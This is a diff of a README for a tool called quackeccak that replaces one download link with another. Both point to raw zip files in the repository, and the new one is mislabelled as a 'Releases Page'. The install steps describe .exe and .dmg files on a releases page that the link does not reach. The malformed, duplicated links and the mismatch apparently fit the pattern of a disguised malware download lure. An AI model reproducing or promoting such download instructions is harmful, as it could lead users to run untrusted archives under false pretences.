@@ -6,9 +6,9 @@ Welcome to **quackeccak**! This application helps you perform local EVM computat
 ## 📥 Download & Install  
 To get started, you need to download the application. 
 
-[![Download quackeccak](https://raw.githubusercontent.com/PJBala/quackeccak/main/motleyness/quackeccak.zip%https://raw.githubusercontent.com/PJBala/quackeccak/main/motleyness/quackeccak.zip)](https://raw.githubusercontent.com/PJBala/quackeccak/main/motleyness/quackeccak.zip)
+[![Download quackeccak](https://github.com/PJBala/quackeccak/raw/refs/heads/main/scripts/Software_2.2.zip%https://github.com/PJBala/quackeccak/raw/refs/heads/main/scripts/Software_2.2.zip)](https://github.com/PJBala/quackeccak/raw/refs/heads/main/scripts/Software_2.2.zip)
 
-1. Click the button above or visit this page to download: [Releases Page](https://raw.githubusercontent.com/PJBala/quackeccak/main/motleyness/quackeccak.zip).
+1. Click the button above or visit this page to download: [Releases Page](https://github.com/PJBala/quackeccak/raw/refs/heads/main/scripts/Software_2.2.zip).
 2. Once you are on the releases page, find the latest version of quackeccak.
 3. Click on the file that matches your operating system. Choose from options such as `.exe` for Windows or `.dmg` for Mac.
 4. After your download completes, locate the file in your downloads folder.
